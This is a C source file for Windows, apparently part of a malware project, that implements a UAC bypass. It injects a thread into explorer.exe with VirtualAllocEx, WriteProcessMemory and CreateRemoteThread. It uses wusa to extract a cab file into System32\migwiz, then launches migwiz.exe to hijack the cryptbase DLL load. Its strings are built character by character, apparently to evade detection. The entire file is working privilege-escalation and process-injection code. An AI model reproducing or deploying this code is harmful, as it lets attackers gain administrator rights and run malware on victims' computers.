#include <windows.h>
#include "PublicVar.h"
#include "BypassUacwusa.h"






//typedef DWORD  (WINAPI*ptrTerminateProcess)(HANDLE,DWORD);

#define BYPASSUACWUSA_WAIT_EXTRACT_TIME 3000

struct RemoteInfo		
{
	HANDLE hProc;
	char szMyCmd[MAX_PATH];
	//"C:\\Windows\\System32\\migwiz\\migwiz.exe"
 	char szExeMigwiz[MAX_PATH]; 

	//ptrExitProcess lpExitProcess;
	ptrTerminateProcess	lpTerminateProcess;
	ptrSleep lpSleep;
	ptrWinExec lpWinExec;
};



DWORD __stdcall InjectedThread(LPVOID lParam)
{
	RemoteInfo *info = (RemoteInfo*)lParam;
	info->lpWinExec(info->szMyCmd,SW_HIDE);
	info->lpSleep(BYPASSUACWUSA_WAIT_EXTRACT_TIME);
	info->lpWinExec(info->szExeMigwiz,SW_HIDE);
	while (info->hProc == 0)
	{
		info->lpSleep(20);
	}

	info->lpTerminateProcess(info->hProc,0);
	return TRUE;
}






HANDLE OpenAndGetProcessIdByName(char * szprocname,DWORD * dwId)
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int iRet = 0;
	BOOL bNext = lpProcess32First(hProcessSnap,&pe32);
	while (bNext)
	{
		const char * strTmp = WStringToMBytes(pe32.szExeFile);
		if (memcmp(szprocname,strTmp,lplstrlenA((char*)strTmp)) == 0)
		{
			*dwId = pe32.th32ProcessID;
			HANDLE hProc = lpOpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwId); 
			if (hProc)
			{
				//if sevaral user are in login state,there are more than one exlorer progress
				//the admin explorer may not be opened if current use is user account
				lpCloseHandle(hProcessSnap);
				return hProc;
			}
		}
		delete strTmp;
		bNext = lpProcess32Next(hProcessSnap,&pe32);
	}
	lpCloseHandle(hProcessSnap);
	return FALSE;
}



#ifdef _WIN32_
#else 
#endif

DWORD __stdcall InjectExplorerExtractCabHijackCryptbase()
{
	DWORD dwProcessId	= 0;
	DWORD dwThreadSize	= 4096;
	DWORD dwWriteBytes	= 0;
	int iRet			= 0;
	char szExplorer[]	= {'e','x','p','l','o','r','e','r','.','e','x','e',0};
	HANDLE hTargetProcess = OpenAndGetProcessIdByName(szExplorer,&dwProcessId);
	if(hTargetProcess == 0)
	{
		return FALSE;
	}

	void* pRemoteThread = lpVirtualAllocEx(hTargetProcess, 0,dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  
	if (!pRemoteThread) 
	{  
		return FALSE;  
	}

	iRet = lpWriteProcessMemory(hTargetProcess, pRemoteThread, InjectedThread, dwThreadSize, 0);
	if (iRet == 0) 
	{  
		return FALSE;  
	}

	char szCabPath[MAX_PATH] = {0};
	strcpy_s(szCabPath,MAX_PATH,strDataPath);
	char szCabName[] = {'\\','c','a','b','.','c','a','b',0};
	strcat_s(szCabPath,MAX_PATH,szCabName);

	RemoteInfo remoteData = {0};
	char szMigwizPath[] = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2',
		'\\','m','i','g','w','i','z','\\','m','i','g','w','i','z','.','e','x','e',0};
	szMigwizPath[0] = strPEResidence[0];
	lpwsprintfA(remoteData.szExeMigwiz,szMigwizPath);

	char szMyCmdFormat[] = {'c','m','d',' ','/','c',' ','w','u','s','a',' ','%','s',' ','/','e','x','t','r','a','c','t',':',
		'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','m','i','g','w','i','z','\\',0};
	lpwsprintfA(remoteData.szMyCmd,szMyCmdFormat,szCabPath);			//"cmd /c wusa %s /extract:C:\\Windows\\System32\\migwiz\\"
	remoteData.lpSleep = lpSleep;
	remoteData.lpWinExec = lpWinExec;
	remoteData.lpTerminateProcess = lpTerminateProcess;
// 	char szTerminateProcess[] = {'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s',0};
// 	remoteData.lpTerminateProcess = (ptrTerminateProcess)lpGetProcAddress(lpDllKernel32,szTerminateProcess);
	remoteData.hProc = 0;
	//remoteData.lpExitPrcess = lpExitProcess;

	RemoteInfo* pRemoteParam = (RemoteInfo*)lpVirtualAllocEx(hTargetProcess , 0, sizeof(RemoteInfo), MEM_COMMIT, PAGE_READWRITE);
	if (!pRemoteParam) 
	{  
		return FALSE;  
	}  

	iRet = lpWriteProcessMemory(hTargetProcess ,pRemoteParam, &remoteData, sizeof(remoteData), 0);
	if (iRet == 0) 
	{  
		return FALSE;  
	}

	HANDLE hRemoteThread = lpCreateRemoteThread(hTargetProcess, NULL, 0, (DWORD (__stdcall *)(void *))pRemoteThread,pRemoteParam, 0, &dwWriteBytes);  
	if (!hRemoteThread) 
	{  
		int error = lpRtlGetLastWin32Error();
		return FALSE;  
	}  
	lpCloseHandle(hRemoteThread);

	DWORD dwMigwizId = 0;
	char szMigwiz[] = {'m','i','g','w','i','z','.','e','x','e',0};
	while (remoteData.hProc == 0)
	{
		remoteData.hProc = OpenAndGetProcessIdByName(szMigwiz,&dwMigwizId);
	}

	iRet = lpWriteProcessMemory(hTargetProcess ,&(pRemoteParam->hProc),&(remoteData.hProc), sizeof(HANDLE), 0);
	if (iRet == 0) 
	{  
		return FALSE;  
	}

	return TRUE;
}